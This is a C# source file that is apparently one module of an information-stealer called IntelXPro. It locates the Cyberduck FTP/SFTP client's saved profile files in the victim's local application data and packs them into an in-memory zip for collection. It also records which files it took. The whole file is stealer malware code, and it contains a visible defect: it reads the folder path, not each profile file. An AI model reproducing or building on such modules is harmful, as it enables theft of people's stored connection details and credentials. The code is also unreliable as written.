using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class CyberDuck : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Cyberduck", "Profiles");
            if (!Directory.Exists(path))
            {
                return;
            }
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "CyberDuck";
            string[] files = Directory.GetFiles(path);
            foreach (string text in files)
            {
                if (text.EndsWith(".cyberduckprofile"))
                {
                    string text2 = "CyberDuck\\" + Path.GetFileName(text);
                    zip.AddFile(text2, File.ReadAllBytes(path));
                    counterApplications.Files.Add(text + " => " + text2);
                }
            }
            counter.Applications.Add(counterApplications);
        }
    }
}
